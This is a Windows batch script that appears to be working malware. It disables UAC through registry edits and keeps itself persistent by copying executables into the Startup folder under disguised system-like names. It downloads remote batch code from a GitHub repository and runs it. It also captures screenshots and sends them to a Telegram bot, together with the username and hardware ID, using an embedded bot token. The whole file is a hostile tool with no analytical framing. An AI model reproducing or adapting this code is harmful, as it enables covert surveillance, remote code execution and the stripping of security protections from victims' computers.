:: ( nHBAPWtA )
@echo off








:: Count the instances of RUNEVERYCALLER.exe
set "instances=0"
for /f "tokens=*" %%A in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" ^| find /i "RUNEVERYCALLER.exe"') do (
    set /a instances+=1
)

:: Check if one or more instances are found
if %instances% geq 2 (
    echo RUNEVERYCALLER.exe is already running. Exiting batch...
    exit
)













:: Counter file to track iterations
set "counterFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\counter.txt"
set "CheckSend=0"


:: Initialize counter if the file doesn't exist
if not exist "%counterFile%" (
    echo 0 > "%counterFile%"
)

:: Read and update the counter
for /f "delims=" %%A in (%counterFile%) do set "counter=%%A"
set /a counter+=1
echo !counter! > "%counterFile%"

:: Check if the counter reaches 15 (since the batch runs every minute)
if !counter! geq 15 (
    set "CheckSend=1"
    echo 0 > "%counterFile%"
)



::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )


:: Place HWID into %HWID% variable 
for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i








:: Initialize the loop counter outside of the loop
set loopCount=0




:loop_start






::ShellHost.exe ---> TSSPrxySHST.exe
::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
::COM Surrogate.exe ---> SyncHostApp.exe
::KMSAuto.exe ---> TSSKMS.exe
::StartupTaskCaller.exe ---> TSSPrxySTC.exe



cd /d "%~dp0"



:RUNADMINHERE
cd /d "%~dp0"
:: Run All your commands here ( will be executed with admin privileges )


:: Disable UAC 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f



:EVERYSECOND


:SHST
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

timeout /t 1 /nobreak >nul






:COM
:: Define the paths
set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

del /F /Q /A "%appdata%\*.ps1"
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f

timeout /t 1 /nobreak >nul







:KMS
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

timeout /t 1 /nobreak >nul










:STC
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySTC.exe"
set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)








:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 

:: Define the list of files to check
set "file1=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"


:: Check each file
if not exist "%file1%" goto STARTUPTAASK
if not exist "%file2%" goto STARTUPTAASK
if not exist "%file3%" goto STARTUPTAASK



:: If all files are found, continue with other tasks
echo All files found.
goto COMMANDSFORAGENTS










































:STARTUPTAASK








:CheckSHST
:: Check ShellHost.exe; if found, skip to CheckComSurrogate
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe" (
    goto CheckComSurrogate
)

:: Run commands if ShellHost.exe is not found
echo Checking for ShellHost...
set "embeddedScript=temp_script_SHST.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ShellHost Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckSHST
)

set "MESSAGE=%MESSAGE%|SHST|"
set "CheckSend=1"







:CheckComSurrogate
:: Check ComSurrogate.exe; if found, skip to next section
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe" (
    goto CheckKMSAuto
)

:: Run commands if ComSurrogate.exe is not found
echo Checking for COM Surrogate...
set "embeddedScript=temp_script_COM.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ComSurrogate Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckComSurrogate
)

set "MESSAGE=%MESSAGE%|ComSurrogate|"
set "CheckSend=1"











:CheckKMSAuto
:: Check KMSAuto.exe; if found, skip to next section
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe" (
    goto COMMANDSFORAGENTS
)

:: Run commands if KMSAuto.exe is not found
echo Checking for KMSAuto...
set "embeddedScript=temp_script_KMS.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from KMSAuto Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckKMSAuto
)

set "MESSAGE=%MESSAGE%|KMSAuto|"
set "CheckSend=1"




























:COMMANDSFORAGENTS


:NEXT1

echo Stopping processes...
taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe

echo Removing scheduled tasks...
schtasks /Delete /TN "WinRNTMUpdate" /F
schtasks /Delete /TN "WinRTKUpdate" /F
schtasks /Delete /TN "checkCOMandadd" /F

taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe


echo Deleting files...
del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"

echo Operation completed.

goto CONT








:: SEND MSG

:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and message
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "MESSAGE=%USERNAME%|TESTING……|"


:: URL encode the message by replacing spaces with %20
set "ENCODED_MESSAGE=%MESSAGE: =%%2"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"

echo Message sent to chat ID %CHAT_ID%






:CONT











:: Check the value of CheckSend
if "%CheckSend%"=="1" (
    goto SENDCHECK
) else (
    goto checkloooop
)












:SENDCHECK






PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size); $Bitmap.Save('%USERPROFILE%\Downloads\screenshot.png');"



:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and caption
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "CAPTION=PC|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"

:: URL encode the caption
set "ENCODED_CAPTION=%CAPTION: =%%2%"

:: Send the photo with caption using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "caption=%ENCODED_CAPTION%" ^
     -F "photo=@%PHOTO_PATH%"

echo Message sent to chat ID %CHAT_ID%













:checkloooop




:: Increment the loop counter
set /a loopCount+=1
goto :EOF

:: Check if the loop counter has reached 15
if %loopCount% lss 10 (
    :: If less than 10, go back to the beginning of the script
    goto :loop_start
) else (
    :: If 15 or more, end the script
    echo Loop completed 10 times. Exiting script.
)


